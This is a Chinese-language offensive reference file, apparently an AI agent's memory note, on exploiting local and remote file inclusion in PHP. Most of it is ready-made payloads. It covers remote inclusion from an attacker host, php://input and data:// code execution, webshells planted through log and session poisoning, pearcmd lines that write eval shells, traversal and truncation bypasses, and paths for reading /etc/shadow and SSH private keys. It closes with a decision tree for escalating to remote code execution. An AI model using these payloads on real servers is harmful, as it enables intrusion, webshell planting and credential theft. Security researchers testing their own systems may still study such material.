---
name: kb_lfi_rfi_2026
description: 文件包含漏洞(LFI/RFI)利用大全—php伪协议/日志包含/session包含/pearcmd/条件竞争/Windows短文件名/截断/远程包含
metadata: 
  node_type: memory
  type: reference
  originSessionId: 5d675b98-bcc4-43f6-b8de-46635cd0836f
---

# LFI/RFI 文件包含漏洞利用大全 (2026版)

## 一、文件包含基础

### LFI vs RFI
| 类型 | 特征 | 危害 |
|------|------|------|
| LFI (本地) | `include($_GET['file']);` 读取本地文件 | 读源码/配置文件/日志RCE |
| RFI (远程) | `include($_GET['file']);` + allow_url_include=On | 直接远程RCE |

### RFI 直接利用
```
php.ini: allow_url_include=On 时
?file=http://attacker/evil.txt    → 远程文件包含RCE
?file=\\attacker\share\evil.txt   → SMB (Windows)
?file=ftp://attacker/evil.txt     → FTP
```

---

## 二、PHP 伪协议大全

### php://filter — 读源码 (最常用)
```
# 读PHP源代码 base64
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=../config.php
?file=php://filter/convert.base64-encode/resource=/etc/passwd

# 读不同编码
?file=php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# rot13编码绕过
?file=php://filter/read=string.rot13/resource=index.php

# 多次编码(WAF绕过)
?file=php://filter/zlib.deflate|convert.base64-encode/resource=index.php
```

### php://filter 链 — RCE (新版绕过)
```
# php_filter_chain_generator.py 生成完整链
# 原理: 利用一系列iconv filter拼接成任意payload
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...

# 工具
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
```

### php://input — POST body 当代码执行
```
# php.ini: allow_url_include=On
POST /index.php?file=php://input
Content-Type: application/x-www-form-urlencoded

<?php system('id');?>
```

### data:// — 伪协议RCE
```
# 需要 allow_url_include=On + allow_url_fopen=On
?file=data://text/plain,<?php system('id');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+     # base64
?file=data:text/plain,<?php system('id');?>
```

### expect:// — 命令执行 (极少见)
```
?file=expect://id
?file=expect://whoami
# 需要安装 expect 扩展
```

### phar:// — Phar反序列化
```
# 上传phar文件(后缀不限于.phar) → include触发反序列化
?file=phar://uploads/shell.jpg
?file=phar://uploads/evil.txt

# 需要 phar.readonly=Off + 上传的phar文件
```

### zip:// — ZIP中文件包含
```
# 上传zip后包含其中文件
?file=zip://uploads/shell.zip%23shell
?file=zip:///var/www/html/uploads/shell.zip%23shell.php
# %23 = # (URL编码)
```

### compress.zlib:// / compress.bzip2://
```
?file=compress.zlib://uploads/shell.gz
?file=compress.bzip2://uploads/shell.bz2
```

---

## 三、日志包含 → RCE (实战最常用)

### Nginx 日志包含
```
# 1. HTTP请求中注shell
GET /<?php system('id');?> HTTP/1.1

# 2. LFI包含Nginx日志
?file=/var/log/nginx/access.log   → 触发payload
?file=../../../var/log/nginx/access.log
?file=/usr/local/nginx/logs/access.log
```

### Apache 日志包含
```
?file=/var/log/apache2/access.log
?file=/var/log/httpd/access_log
?file=/var/log/apache/access.log

# CentOS/RHEL: /var/log/httpd/
# Ubuntu/Debian: /var/log/apache2/
# macOS: /var/log/apache2/
```

### 利用Burp改User-Agent注入payload (更干净)
```
# 不用污染URL，改User-Agent放payload
User-Agent: <?php system('id');?>
→ 请求后包含access.log
```

### SSH 日志包含
```
# ssh登录
ssh '<?php system($_GET[1]);?>'@target

# 包含auth.log
?file=/var/log/auth.log
```

### 邮件日志
```
/var/log/mail.log
/var/log/maillog
```

### Windows 日志路径
```
C:\nginx\log\access.log
C:\Apache24\logs\access.log
C:\inetpub\logs\LogFiles\
C:\xampp\apache\logs\
```

---

## 四、Session 文件包含

### PHP Session 包含
```
# 1. 在可控输入(登录页用户名)中注: <?php system('id');?>
#    Session文件: /tmp/sess_<PHPSESSID>

# 2. LFI包含
?file=/tmp/sess_xxxxxxxxxxxx
?file=/var/lib/php/sessions/sess_xxxxxxxxxxxx
?file=/var/lib/php5/sess_xxxxxxxxxxxx
?file=C:\Windows\Temp\sess_xxxxxxxxxxxx
```

---

## 五、pearcmd.php 包含 → RCE

### 利用 PHP register_argc_argv (默认开启)
```
# pearcmd.php 在 PHP Docker/默认安装中存在
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[1]);?>+/tmp/shell.php
# 然后包含
?file=/tmp/shell.php&1=id

# 或
?+config-create+/<?=@eval($_POST[1]);?>+/var/www/html/shell.php
```

---

## 六、/proc 和 FD 包含 (Linux)

### /proc/self/environ
```
# User-Agent 注入payload
User-Agent: <?php system('id');?>
?file=/proc/self/environ
```

### /proc/self/fd/
```
# 利用 php://input 请求, PHP打开FD
# 包含对应的FD
?file=/proc/self/fd/0    → 读取当前进程stdin
?file=/proc/self/fd/1
?file=/proc/self/fd/7    → 盲猜
```

---

## 七、目录穿越

### 基本穿越
```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd      # 双写绕过过滤
?file=....\/....\/....\/etc/passwd      # 反斜杠 (Windows)
?file=..%2F..%2F..%2Fetc%2Fpasswd      # URL编码
?file=..%252f..%252f..%252fetc/passwd  # 双重编码
```

### 绝对路径 LFI (绕过前缀拼接)
```
?file=/etc/passwd                # 直接绝对路径
?file=//etc/passwd               # 双斜杠
?file=\\etc\\passwd              # 反斜杠(Win)
```

---

## 八、Windows LFI 特化

### 短文件名绕过
```
# Windows 8.3 短文件名
C:\Progra~1 → C:\Program Files
C:\WINDOWS\win.ini  → C:\WINDOWS\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

### NTFS 流
```
?file=shell.php::$DATA
```

### SMB 包含 (Windows → RFI)
```
# 需要目标PHP在Windows上运行,allow_url_include=On
?file=\\attacker_ip\share\evil.txt
```

---

## 九、截断绕过

### %00 截断 (< PHP 5.3.4, magic_quotes_gpc=Off)
```
?file=../../../etc/passwd%00
?file=shell.jpg%00
```

### 长文件名截断 (4096字节)
```
?file=../../../etc/passwd/././././....(重复~4096个)./././.
?file=shell.jpg/./././././....../././.
→ PHP 会自动截断末尾多余的 /./
```

### 点号截断 (Windows)
```
?file=shell.jpg......................................................................
→ Windows 限制260字符, 自动去掉末尾点
```

---

## 十、LFI 自动化工具

### LFI检测
```
# ffuf fuzz Linux路径
ffuf -w lfi_linux.txt -u 'http://target/index.php?file=FUZZ'

# ffuf fuzz Windows路径
ffuf -w lfi_windows.txt -u 'http://target/index.php?file=FUZZ'

# Burp Intruder + LFI payload list
```

### LFI2RCE 利用框架
```
# LFISuite
git clone https://github.com/D35m0nd142/LFISuite
python lfisuite.py

# PHP Filter Chain Generator
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
```

---

## 十一、常见 LFI 路径字典 (前20)

```
Linux:
/etc/passwd
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/nginx/access.log
/var/log/apache2/access.log
/var/log/auth.log
/usr/local/lib/php/pearcmd.php
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/php/7.4/fpm/php.ini
/root/.ssh/id_rsa
/home/*/.ssh/id_rsa
/etc/shadow
/etc/issue

Windows:
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\nginx\conf\nginx.conf
C:\Windows\debug\NetSetup.LOG
```

---

## 十二、LFI → RCE 决策树

```
1. 有 allow_url_include=On?
   → YES: php://input / data:// / RFI (http://)
   → NO: 往下走

2. 能控制服务器上的文件内容?
   → 日志包含 (access.log/auth.log)
   → Session包含 (/tmp/sess_xxx)
   → /proc/self/environ 包含

3. 有上传功能?
   → ZIP包含 + 图片马
   → phar:// 反序列化

4. 有pearcmd.php?
   → +config-create 写shell

5. 上面都不行?
   → php://filter/iconv 链 (php_filter_chain_generator)
   → /proc/self/fd/ 盲猜FD

6. 实在不行?
   → 至少读源码/配置文件/WEB-INF → 挖其他漏洞
```